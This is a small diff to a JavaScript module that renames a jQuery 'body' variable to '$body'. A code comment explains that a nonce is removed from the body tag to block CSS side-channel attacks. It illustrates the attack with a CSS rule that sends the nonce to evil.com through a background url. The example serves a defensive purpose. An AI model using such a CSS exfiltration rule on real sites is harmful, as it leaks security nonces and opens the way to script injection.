@@ -329,13 +329,13 @@ export const scout = {
     $('noscript', targetDocument).remove();
     $('scout-text', targetDocument).remove();
     $('scout-version', targetDocument).remove();
-    let body = $('body', targetDocument);
+    let $body = $('body', targetDocument);
 
     // remove the nonce from the body tag to prevent css side-channel attacks:
     // script[nonce~="whatever"] {
     //   background: url("https://evil.com/nonce?whatever");
     // }
-    body.addDeviceClass()
+    $body.addDeviceClass()
       .removeAttr('data-scout-nonce')
       .removeData('scoutNonce'); // also remove from data map of body tag as it is stored on App.nonce now.
 
